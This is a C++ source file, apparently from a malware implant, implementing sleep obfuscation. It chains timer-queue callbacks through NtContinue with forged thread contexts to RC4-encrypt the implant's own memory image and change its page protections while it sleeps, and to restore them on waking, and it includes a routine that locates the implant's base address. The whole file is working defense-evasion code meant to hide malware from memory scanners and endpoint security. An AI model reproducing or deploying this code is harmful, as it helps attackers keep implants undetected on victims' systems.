//
// Created by diago on 2024-05-24.
//

#include <sleep.hpp>

void
obfus::sleep(const uint32_t sleep_time) {

    CONTEXT ctx_curthread   =   { 0 };
    CONTEXT ctx_protrw      =   { 0 };
    CONTEXT ctx_protrwx     =   { 0 };
    CONTEXT ctx_delay       =   { 0 };
    CONTEXT ctx_encrypt     =   { 0 };
    CONTEXT ctx_decrypt     =   { 0 };
    CONTEXT ctx_setevent    =   { 0 };
    USTRING key             =   { 0 };
    USTRING image           =   { 0 };

    static HANDLE hEvent = nullptr;
    static uint8_t* image_base = nullptr;

    HANDLE hNewTimer = nullptr;
    HANDLE hTimerQueue = CreateTimerQueue();

    uint32_t image_size = 0;
    uint32_t old_protect = 0;

    unsigned char byte_buffer[16] = { 0 };
    void* pSystemFunction032    =  GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
    void* pNtContinue           =  GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
    void* pRtlCaptureContext    =  GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCaptureContext");

    //----------------------------------------------------------------------------------------------------//

    if(hEvent == nullptr) {
        hEvent = CreateEventW(
            nullptr,
            FALSE,
            FALSE,
            nullptr
        );
    }

    if(image_base == nullptr) {
        image_base = get_implant_base_address();
    }

    if (!hEvent || !pRtlCaptureContext || !pNtContinue || !pSystemFunction032 || !hTimerQueue) {
        return;
    }

    image_size = ((PIMAGE_NT_HEADERS)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.SizeOfImage;

    key.Buffer = byte_buffer;
    key.Length = 16;
    key.MaximumLength = 16;

    image.Buffer = image_base;
    image.Length = image_size;
    image.MaximumLength = image_size;

    init_rc4_key(&key);

    if(CreateTimerQueueTimer(
        &hNewTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)pRtlCaptureContext,
        &ctx_curthread,
        0, 0,
        WT_EXECUTEINTIMERTHREAD
    )) {

        WaitForSingleObject(hEvent, 0x32);
        memcpy(&ctx_protrw,     &ctx_curthread, sizeof(CONTEXT));
        memcpy(&ctx_protrwx,    &ctx_curthread, sizeof(CONTEXT));
        memcpy(&ctx_decrypt,    &ctx_curthread, sizeof(CONTEXT));
        memcpy(&ctx_encrypt,    &ctx_curthread, sizeof(CONTEXT));
        memcpy(&ctx_delay,      &ctx_curthread, sizeof(CONTEXT));
        memcpy(&ctx_setevent,   &ctx_curthread, sizeof(CONTEXT));


        // VirtualProtect(image_base, image_size, PAGE_READWRITE, &old_protect);
        ctx_protrw.Rsp -= 8;
        ctx_protrw.Rip = reinterpret_cast<DWORD64>(VirtualProtect);
        ctx_protrw.Rcx = reinterpret_cast<DWORD64>(image_base);
        ctx_protrw.Rdx = image_size;
        ctx_protrw.R8 = PAGE_READWRITE;
        ctx_protrw.R9 = reinterpret_cast<DWORD64>(&old_protect);

        // SystemFunction032(&image, &key);
        ctx_encrypt.Rsp -= 8;
        ctx_encrypt.Rip = reinterpret_cast<DWORD64>(pSystemFunction032);
        ctx_encrypt.Rcx = reinterpret_cast<DWORD64>(&image);
        ctx_encrypt.Rdx = reinterpret_cast<DWORD64>(&key);

        // WaitForSingleObject(GetCurrentProcess(), sleep_time);
        ctx_delay.Rsp -= 8;
        ctx_delay.Rip = reinterpret_cast<DWORD64>(WaitForSingleObject);
        ctx_delay.Rcx = reinterpret_cast<DWORD64>(NtCurrentProcess());
        ctx_delay.Rdx = sleep_time;

        // SystemFunction032(&Image, &Key);
        ctx_decrypt.Rsp -= 8;
        ctx_decrypt.Rip = reinterpret_cast<DWORD64>(pSystemFunction032);
        ctx_decrypt.Rcx = reinterpret_cast<DWORD64>(&image);
        ctx_decrypt.Rdx = reinterpret_cast<DWORD64>(&key);

        // VirtualProtect(image_base, image_size, PAGE_EXECUTE_READWRITE, &old_protect);
        ctx_protrwx.Rsp -= 8;
        ctx_protrwx.Rip = reinterpret_cast<DWORD64>(VirtualProtect);
        ctx_protrwx.Rcx = reinterpret_cast<DWORD64>(image_base);
        ctx_protrwx.Rdx = image_size;
        ctx_protrwx.R8  = PAGE_EXECUTE_READWRITE;
        ctx_protrwx.R9  = reinterpret_cast<DWORD64>(&old_protect);

        // SetEvent(hEvent);
        ctx_setevent.Rsp -= 8;
        ctx_setevent.Rip = reinterpret_cast<DWORD64>(SetEvent);
        ctx_setevent.Rcx = reinterpret_cast<DWORD64>(hEvent);


        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ctx_protrw,   100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ctx_encrypt,  200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ctx_delay,    300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ctx_decrypt,  400, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ctx_protrwx,  500, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &ctx_setevent, 600, 0, WT_EXECUTEINTIMERTHREAD);

        WaitForSingleObject(hEvent, INFINITE);
    }

    DeleteTimerQueue(hTimerQueue);
}


uint8_t*
get_implant_base_address() {

    auto* itr = reinterpret_cast<char*>(get_implant_base_address);
    const char dos_string[] = {"!This program"};

    while(true) {
        if (itr[0] == '!' && itr[1] == 'T') {

            //
            // "!This program cannot be run in DOS mode."
            //

            if (strncmp(dos_string, itr, 13) == 0) {
                while (itr[0] != 'M' || itr[1] != 'Z') {
                    --itr;
                }

                return reinterpret_cast<uint8_t*>(itr);
            }
        }

        --itr;
    }
}


void init_rc4_key(USTRING *pKey) {

    srand(time(nullptr));
    uint8_t* itr = static_cast<uint8_t*>(pKey->Buffer);

    for(size_t i = 0; i < pKey->Length; i++) {
        itr[i] = (rand() % 256);
    }
}